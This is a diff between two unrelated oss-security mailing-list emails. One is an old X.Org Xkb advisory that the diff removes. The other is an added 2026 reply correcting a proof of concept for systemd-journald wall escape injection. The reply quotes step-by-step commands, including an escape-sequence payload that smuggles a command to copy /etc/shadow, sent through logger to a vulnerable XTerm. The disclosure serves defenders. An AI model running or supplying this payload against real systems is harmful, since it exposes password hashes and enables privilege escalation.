@@ -1,4 +1,4 @@
-Received: (qmail 13996 invoked by uid 550); 12 Jul 2022 13:13:50 -0000
+Received: (qmail 9388 invoked by uid 550); 8 Apr 2026 15:48:01 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,123 +7,69 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7312 invoked from network); 12 Jul 2022 12:58:31 -0000
-ARC-Seal: i=1; a=rsa-sha256; t=1657630698; cv=none; 
-	d=zohomail.com; s=zohoarc; 
-	b=A7AC8eqTDLawZ+Z82QVYjO7eGhwh1SLf1riyZFF1IMje0tBuKfMcpeWV9lHVcpqjOKkpKf1wgqH9jadLA4wcRo3TdmfqUHJ8TEXSf2V4+iNNty0HOn/xOAfPlaA9W/+0NGkzQW0IKYUrzad4FfFGZrDhCCQz0smwKawNl5h4g6I=
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=zohomail.com; s=zohoarc; 
-	t=1657630698; h=Content-Type:Content-Transfer-Encoding:Date:From:In-Reply-To:MIME-Version:Message-ID:References:Subject:To; 
-	bh=rq0NIxNM/MNGO37IYTtXWVm/ac21eXhI+YKt3CDmHmw=; 
-	b=FmYCmM5cZyYVy+/a1dyHecASpWP8JkElPvfKVzxbmmuq40lLhyYbNoIsk4yMw144+ttfoHZwN7Pp7JWg2wtkzfAoZi4h6VxXxc3bUWaFV+VMupkI4ujkZvIjqodRGCujsW94bMMEguPJrr8lXWNoFcg39Rfqj1Ev8wCokPXsePY=
-ARC-Authentication-Results: i=1; mx.zohomail.com;
-	dkim=pass  header.i=radix.lt;
-	spf=pass  smtp.mailfrom=povilas@radix.lt;
-	dmarc=pass header.from=<povilas@radix.lt>
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; t=1657630698;
-	s=zoho; d=radix.lt; i=povilas@radix.lt;
-	h=Message-ID:Date:Date:MIME-Version:Subject:Subject:References:To:To:From:From:In-Reply-To:Content-Type:Content-Transfer-Encoding:Message-Id:Reply-To:Cc;
-	bh=rq0NIxNM/MNGO37IYTtXWVm/ac21eXhI+YKt3CDmHmw=;
-	b=RAcSDCQeo/gkMqPkbPBjCp0+CnprQB/lycXloXjfr78Ovdzz1l3EPk0kbjzGjI7A
-	ZIBWz+sySV8FY1rVAyNDIBHyCDTjSdc4Z5iebK9KWI9CuQpjEwj23ijCdC59PiqDAvc
-	gbfkZDpOnnppqvd2pLC4m0YJza4Nglq2omepVNH0=
-Message-ID: <c8c9ce86-d45d-51e5-cf4a-b33ad24c88f2@radix.lt>
-Date: Tue, 12 Jul 2022 15:58:15 +0300
-MIME-Version: 1.0
-Content-Language: en-US
-References: <fbb1ece7-fe2b-ff62-b316-43d99271e83f@radix.lt>
+x-ms-reactions: disallow
+Received: (qmail 32363 invoked from network); 8 Apr 2026 14:23:05 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=riseup.net; s=squak;
+	t=1775658175; bh=xUbUOFFP1Vs9TBXjbPHGTpwLsP1iS9WcgK0RogZSg0U=;
+	h=Date:From:To:Cc:Subject:In-Reply-To:References:From;
+	b=AH+5Uqxn6xxmJQgWwlYq8c06LvO7KwoRfTLk7SSuAnW6gLJ0QDX4jbmf71+rX2zT6
+	 HVwIqbgzzIAvfTdbCxFXjdSxaJsYTBcs2povYeAYMl+IxSPx26asDOrzLv1sPJSSgt
+	 wvZ8QpKTaCgBvFnYQfmnuEJnPUtav92f71UtydEY=
+X-Riseup-User-ID: 44F605A70AA8B8CE57D5B1A0352EE9FF376EFD3D08A00A8B2380824EC28A347E
+Date: Wed, 8 Apr 2026 10:22:01 -0400
+From: Aaron Rainbolt <arraybolt3@riseup.net>
 To: oss-security@lists.openwall.com
-From: Povilas Kanapickas <povilas@radix.lt>
-In-Reply-To: <fbb1ece7-fe2b-ff62-b316-43d99271e83f@radix.lt>
-X-Forwarded-Message-Id: <fbb1ece7-fe2b-ff62-b316-43d99271e83f@radix.lt>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-ZohoMailClient: External
-Subject: [oss-security] Fwd: X.Org Security Advisory: July 12, 2022
+Cc: adrelanos@whonix.org, arraybolt3@gmail.com
+Message-ID: <20260408102148.0d45e3a2@riseup.net>
+In-Reply-To: <20260407200906.14b9bcc0@riseup.net>
+References: <20260407200906.14b9bcc0@riseup.net>
+MIME-Version: 1.0
+Content-Type: multipart/signed; boundary="Sig_/UM6VD4j6MW4=v+r8Jbv/yi6";
+ protocol="application/pgp-signature"; micalg=pgp-sha512
+Subject: [oss-security] Re: systemd-journald in systemd 259 does not escape characters in
+ emerg messages that are wall'd to other user's terminals
 
--------- Forwarded Message --------
-Subject: X.Org Security Advisory: July 12, 2022
-Date: Tue, 12 Jul 2022 15:55:05 +0300
-From: Povilas Kanapickas <povilas@radix.lt>
-To: xorg-announce@lists.x.org
-CC: xorg-devel@lists.x.org <xorg-devel@lists.x.org>, xorg@lists.x.org
+--Sig_/UM6VD4j6MW4=v+r8Jbv/yi6
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: quoted-printable
 
-X.Org Security Advisory: July 12, 2022
+A minor correction:
 
-Multiple input validation failures in X server extensions
-=========================================================
+> A more involved proof-of-concept that demonstrates how this can be
+> used to escalate privileges is:
+>=20
+> 1. Compile a version of XTerm that is vulnerable to CVE-2022-45063.
+>    (XTerm patch #369 worked for me last time I tried this.)
+> 2. Open two instances of XTerm at once as a non-root user.
+> 3. In one XTerm window, open a root shell by running `sudo -i`.
 
-All theses issues can lead to local privileges elevation on systems
-where the X server is running privileged and remote code execution for
-ssh X forwarding sessions.
+The root shell needs to be provided by ZSH, and ZSH needs to be put
+into vi line editing mode, for this to work. See [1].
 
-* CVE-2022-2319/ZDI-CAN-16062: X.Org Server ProcXkbSetGeometry Out-Of-Bounds
-Access
+> 4. In the other XTerm window, as a non-root user, run
+>    `pwned=3D$'\e]50;i$(cp /etc/shadow /home/user/shadow && chown
+> user:user /home/user/shadow)\a\e]50;?\a\n'` (replacing 'user' with
+> your non-root user's username where appropriate).
+> 5. In the same non-root XTerm window, run
+>    `logger -p 'emerg' "$pwned"`. You should now have a copy of the
+>    system's shadow password file in your home directory, readable by
+>    your non-root user.
 
-The handler for the ProcXkbSetGeometry request of the Xkb extension does
-not properly validate the request length leading to out of bounds memory
-write.
-
-* CVE-2022-2320/ZDI-CAN-16070: X.Org Server ProcXkbSetDeviceInfo 
-Out-Of-Bounds
-Access
-
-The handler for the ProcXkbSetDeviceInfo request of the Xkb extension
-does not properly validate the request length leading to out of bounds
-memory write.
-
-Patches
--------
-
-Patches for this issues have been committed to the xorg server git
-repository. xorg-server 21.1.4 will be released shortly and will
-include these patches.
-
-commit 6907b6ea2b4ce949cb07271f5b678d5966d9df42
-
-     xkb: add request length validation for XkbSetGeometry
-         No validation of the various fields on that report were done, so a
-     malicious client could send a short request that claims it had N
-     sections, or rows, or keys, and the server would process the request
-     for N sections, running out of bounds of the actual request data.
-         Fix this by adding size checks to ensure our data is valid.
-         Fixes ZDI-CAN 16062, CVE-2022-2319.
-         This vulnerability was discovered by:
-     Jan-Niklas Sohn working with Trend Micro Zero Day Initiative
-
-
-commit dd8caf39e9e15d8f302e54045dd08d8ebf1025dc
-
-     xkb: swap XkbSetDeviceInfo and XkbSetDeviceInfoCheck
-         XKB often uses a FooCheck and Foo function pair, the former is
-     supposed to check all values in the request and error out on
-     BadLength, BadValue, etc. The latter is then called once we're
-     confident the values are good (they may still fail on an individual
-     device, but that's a different topic).
-         In the case of XkbSetDeviceInfo, those functions were incorrectly
-     named, with XkbSetDeviceInfo ending up as the checker function and
-     XkbSetDeviceInfoCheck as the setter function. As a result, the setter
-     function was called before the checker function, accessing request
-     data and modifying device state before we ensured that the data is
-     valid.
-         In particular, the setter function relied on values being already
-     byte-swapped. This in turn could lead to potential OOB memory access.
-         Fix this by correctly naming the functions and moving the 
-length checks
-     over to the checker function. These were added in 87c64fc5b0 to the
-     wrong function, probably due to the incorrect naming.
-         Fixes ZDI-CAN 16070, CVE-2022-2320.
-         This vulnerability was discovered by:
-     Jan-Niklas Sohn working with Trend Micro Zero Day Initiative
-         Introduced in c06e27b2f6fd9f7b9f827623a48876a225264132
-
-Backporting of the security fixes also needs this commit:
-f1070c01d616c5f21f939d5ebc533738779451ac.
-
-Thanks
-======
-
-The vulnerabilities have been discovered by Jan-Niklas Sohn working with
-Trend Micro Zero Day Initiative and fixed by Peter Hutterer.
+[1] https://www.openwall.com/lists/oss-security/2022/11/10/1
 
 --
-Povilas Kanapickas
+Aaron
+
+--Sig_/UM6VD4j6MW4=v+r8Jbv/yi6
+Content-Type: application/pgp-signature
+Content-Description: OpenPGP digital signature
+
+-----BEGIN PGP SIGNATURE-----
+
+iHUEARYKAB0WIQS8QsiCjFi4DcDBX+Q5rdye4jrrCAUCadZkiQAKCRA5rdye4jrr
+CAxaAP9BzNyyK6qLtVpZgIgFSW0kwIkTVvPiUWisTwOZhqTwQAEApVHTPESNYrV2
+2h1876ynlYZ/gkQGZT3+op8Kiu/ouwI=
+=Y1ni
+-----END PGP SIGNATURE-----
+
+--Sig_/UM6VD4j6MW4=v+r8Jbv/yi6--
